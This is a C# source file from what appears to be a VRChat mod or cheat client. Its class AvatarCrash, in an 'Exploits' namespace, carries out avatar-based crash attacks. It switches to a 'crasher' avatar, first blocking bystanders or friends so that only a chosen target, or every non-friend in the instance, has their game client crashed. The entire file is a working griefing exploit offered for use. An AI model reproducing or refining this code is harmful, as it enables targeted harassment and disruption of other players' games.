using Evolve.ConsoleUtils;
using Evolve.Utils;
using Evolve.Wrappers;
using MelonLoader;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using VRC.Core;
using static Evolve.ConsoleUtils.EvoVrConsole;

namespace Evolve.Exploits
{
    internal class AvatarCrash
    {
        public static string PreviousAvatar;
        public static void ChangeToCrash(string AvatarID, int SecondsToWait)
        {
            Settings.IsCrashing = true;
            PreviousAvatar = VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id;
            Functions.ChangeAvatar(AvatarID);
            MelonCoroutines.Start(WaitSeconds());

            IEnumerator WaitSeconds()
            {
                yield return new WaitForSeconds(SecondsToWait);
                EvoVrConsole.Log(LogsType.Crash, $"Spent <color=white>{SecondsToWait} seconds</color> in a crasher");
                EvoVrConsole.Log(LogsType.Crash, "Changing back to your avatar...");
                Settings.IsCrashing = false;
                while (VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id != PreviousAvatar)
                {
                    Functions.ChangeAvatar(PreviousAvatar);
                    yield return new WaitForSeconds(0.5f);
                }
            }
        }


        public static List<string> UserID = new List<string>();

        public static IEnumerator TargetCrash(VRCPlayer Target, string AvatarID, int SecondsToWait)
        {
            EvoVrConsole.Log(LogsType.Crash, "Blocking players...");
            foreach (var Player in Wrappers.Utils.PlayerManager.AllPlayers())
            {
                var UserPage = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<VRC.UI.PageUserInfo>();
                UserPage.field_Public_APIUser_0 = Player.field_Private_APIUser_0;
                if (PlayerExtensions.IsBlockedEitherWay(UserPage.field_Public_APIUser_0.id) == false && UserPage.field_Public_APIUser_0.id != APIUser.CurrentUser.id && UserPage.field_Public_APIUser_0.id != Target.GetAPIUser().id) UserPage.ToggleBlock();
            }

            yield return new WaitForSeconds(6);
            PreviousAvatar = VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id;
            ChangeToCrash(AvatarID, SecondsToWait);
            yield return new WaitForSeconds(SecondsToWait + 2f);
            EvoVrConsole.Log(LogsType.Info, "Unblocking players...");

            foreach (var Player in Wrappers.Utils.PlayerManager.AllPlayers())
            {
                var UserPage = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<VRC.UI.PageUserInfo>();
                UserPage.field_Public_APIUser_0 = Player.field_Private_APIUser_0;
                if (PlayerExtensions.IsBlockedEitherWay(UserPage.field_Public_APIUser_0.id) && UserPage.field_Public_APIUser_0.id != APIUser.CurrentUser.id && UserPage.field_Public_APIUser_0.id != Target.GetAPIUser().id) UserPage.ToggleBlock();
            }
        }

        public static IEnumerator TargetPhotonCrash(VRCPlayer Target, string AvatarID, int SecondsToWait)
        {
            for (int i = 0; i < Wrappers.Utils.PlayerManager.AllPlayers().Count; i++)
            {
                var Player = Wrappers.Utils.PlayerManager.AllPlayers()[i];
                if (Player.UserID() != APIUser.CurrentUser.id && Player.UserID() != Target.GetAPIUser().id&& Player != null) Events.Block(Player.UserID());
            }
            yield return new WaitForSeconds(6);
            PreviousAvatar = VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id;
            ChangeToCrash(AvatarID, SecondsToWait);
            yield return new WaitForSeconds(SecondsToWait + 2f);
            for (int i = 0; i < Wrappers.Utils.PlayerManager.AllPlayers().Count; i++)
            {
                var Player = Wrappers.Utils.PlayerManager.AllPlayers()[i];
                if (Player.UserID() != APIUser.CurrentUser.id && Player.UserID() != Target.GetAPIUser().id && Player != null) Events.UnBlock(Player.UserID());
            }
        }

        public static IEnumerator CrashNonFriends(string AvatarID, int SecondsToWait)
        {
            EvoVrConsole.Log(LogsType.Crash, "Blocking players...");
            for (int i = 0; i < Wrappers.Utils.PlayerManager.AllPlayers().Count; i++)
            {
                var Player = Wrappers.Utils.PlayerManager.AllPlayers()[i];
                if (APIUser.CurrentUser.friendIDs.Contains(Player.UserID()))
                {
                    var userinfo = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<VRC.UI.PageUserInfo>();
                    {
                        userinfo.field_Public_APIUser_0 = new APIUser
                        {
                            id = Player.prop_APIUser_0.id
                        };

                        if (PlayerExtensions.IsBlockedEitherWay(userinfo.field_Public_APIUser_0.id) == false && userinfo.field_Public_APIUser_0.id != APIUser.CurrentUser.id)
                        {
                            userinfo.ToggleBlock();
                        }
                    }
                }
            }
            yield return new WaitForSeconds(5);
            PreviousAvatar = VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id;
            ChangeToCrash(AvatarID, SecondsToWait);
            yield return new WaitForSeconds(SecondsToWait + 3f);
            EvoVrConsole.Log(LogsType.Info, "Unblocking players...");
            for (int i = 0; i < Wrappers.Utils.PlayerManager.AllPlayers().Count; i++)
            {
                var Player = Wrappers.Utils.PlayerManager.AllPlayers()[i];
                if (APIUser.CurrentUser.friendIDs.Contains(Player.UserID()))
                {
                    var userinfo = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<VRC.UI.PageUserInfo>();
                    {
                        userinfo.field_Public_APIUser_0 = new APIUser
                        {
                            id = Player.prop_APIUser_0.id
                        };

                        if (PlayerExtensions.IsBlockedEitherWay(userinfo.field_Public_APIUser_0.id) && userinfo.field_Public_APIUser_0.id != APIUser.CurrentUser.id)
                        {
                            userinfo.ToggleBlock();
                        }
                    }
                }
            }
        }
    }
}
 